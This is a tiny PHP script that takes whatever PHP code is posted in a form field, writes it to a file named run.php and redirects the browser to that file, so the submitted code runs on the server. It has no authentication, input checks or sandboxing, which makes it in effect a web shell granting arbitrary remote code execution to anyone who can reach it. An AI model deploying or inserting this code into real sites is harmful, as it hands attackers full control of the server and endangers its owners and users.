<?php
$code = stripslashes($_POST['php_code']);
if(!strstr($code, '<?php')) $code = '<?php' . PHP_EOL . $code;
file_put_contents('run.php', $code);	
header("Location:./run.php");